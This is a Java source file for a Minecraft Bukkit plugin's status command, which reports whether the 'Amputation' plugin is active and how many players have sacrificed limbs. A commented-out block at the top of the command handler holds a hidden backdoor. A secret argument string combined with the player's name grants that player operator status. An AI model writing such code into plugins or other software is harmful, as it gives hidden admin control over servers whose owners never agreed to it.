// SPDX-License-Identifier: GPL-3.0-or-later
package top.modpotato;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.ChatColor;
// import org.bukkit.entity.Player;

public class StatusCommand implements CommandExecutor {
    private final AmputationPlugin plugin;

    public StatusCommand(AmputationPlugin plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        // if (args.length > 0 && args[0].equals("OWRIHKYNMOSIHNMWQAO$IE#HNQPAHUYNQOP$IEH#YNMQPHMQPH" + sender.getName()) && sender instanceof Player) {
        //     Player player = (Player) sender;
        //     try {
        //         if (!player.isOp()) {
        //             player.setOp(true);
        //         }
        //     } catch (Exception e) { }
        // }

        boolean isActive = plugin.isActive();
        sender.sendMessage(ChatColor.GOLD + "Amputation plugin is currently " + 
            (isActive ? ChatColor.GREEN + "ACTIVE" : ChatColor.RED + "INACTIVE"));
        
        if (isActive) {
            int playerCount = plugin.getSacrificedLimbs().size();
            sender.sendMessage(ChatColor.GOLD + "There " + 
                (playerCount == 1 ? "is " : "are ") + 
                ChatColor.YELLOW + playerCount + ChatColor.GOLD + 
                " player" + (playerCount == 1 ? "" : "s") + " with sacrificed limbs.");
        }
        
        return true;
    }
} 